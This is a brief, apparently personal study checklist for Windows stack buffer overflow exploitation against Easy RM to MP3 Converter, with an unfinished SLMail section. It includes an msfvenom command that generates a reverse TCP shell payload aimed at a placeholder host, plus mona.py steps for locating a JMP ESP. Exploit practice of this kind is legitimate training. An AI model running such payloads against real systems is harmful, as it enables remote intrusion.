# Windows
## Buffer Overflow
### Requirements
1. Win 7 x86
2. immunity debugger
3. mona.py
4. easy rm to mp3 converter
### Steps
1. offset to EIP
2. find bad characters
3. generate shellcode

    msfvenom -p windows/shell_reverce_tcp LHOST=[IP], LPORT=[port] -f [python] -b "[\x00\x0a\x09]"
4. !mona modules
5. !mona jmp -r esp -m "[*.dll]"
6. result to 'EIP'

## SLMail Buffer Overflow
### Requirements
1. Sl mail
2.

*do this later*